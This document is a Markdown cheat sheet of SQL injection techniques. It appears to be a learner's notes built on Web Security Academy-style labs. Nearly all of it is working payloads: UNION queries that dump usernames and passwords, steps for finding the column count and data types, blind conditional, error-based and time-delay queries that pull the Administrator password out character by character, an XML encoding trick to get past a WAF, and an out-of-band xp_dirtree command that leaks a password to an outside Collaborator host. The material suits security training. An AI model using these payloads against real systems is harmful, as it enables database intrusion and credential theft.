---

---
# # Examples of SQL injection

- Union Based
- Blind
- Second-order SQL injection

# Examining the Database

> [!note]+ There are differences in different database platforms
> - Syntax for string concatenation.
> - Comments.
> - Batched (or stacked) queries.
> - Platform-specific APIs.
> - Error messages.
# Detecting SQL injection vulnerabilities
## SQL Injection in different contexts
> If it is a numerical value try `1+1` to see if it is evaluated

### Hackverter to bypass WAFs
```
<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>
      1
    </productId>
    <storeId>
      1 <@dec_entities>
        UNION SELECT username || '~' || password FROM users
      </@dec_entities>
       
    </storeId>
  </stockCheck>
```

# Examining the database
## Querying the type and version
```
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

For example, you could use a `UNION` attack with the following input:

`' UNION SELECT @@version--`
```
> Oracle databases require a table to `SELECT` `FROM`
> A builtin table `dual` can be used for this purposes eg:

`+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

## Listing the contents of the database
### Non-Oracle
- Listing tables => `SELECT * FROM information_schema.tables`
- Listing columns => `SELECT * FROM information_schema.columns WHERE table_name = '<TABLE>'`

### Oracle
- Listing tables => `SELECT * FROM all_tables`
- Listing columns => `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`
# SQL injection UNION attacks
> - How many columns are being returned from the original query.
> - Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

## Determining the number of columns
### Non Oracle
1) By using `ORDER`
> `ORDER BY` can be used by its index and name of the column is not needed
Until you get an error:
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```
2) By using `NULL`
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
### Oracle
`' UNION SELECT NULL FROM DUAL--`

## Finding Columns with useful data type
> Check if `int` or `string` is expected
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

## Retrieving multiple values within a single column
`' UNION SELECT username || '~' || password FROM users--`

# Blind SQL Injection
## Scenario
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

# SQL query
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

### Conditional Responses
> You can slowly determine the password:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

### Error Based
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

Checking whether table exists:
```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

Check user `administrator` exists
```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

### Extracting sensitive data via verbose SQL error messages
- Using `CAST`
```
CAST((SELECT example_column FROM example_table) AS int)
```
- Example output:
```
ERROR: invalid input syntax for type integer: "Example data"
```

- Example password recovery:
```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--;
```

### With Time Delays
- Microsoft SQL
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

### Out of band blind SQL
- Checking for interaction
```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
- Exfiltration
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```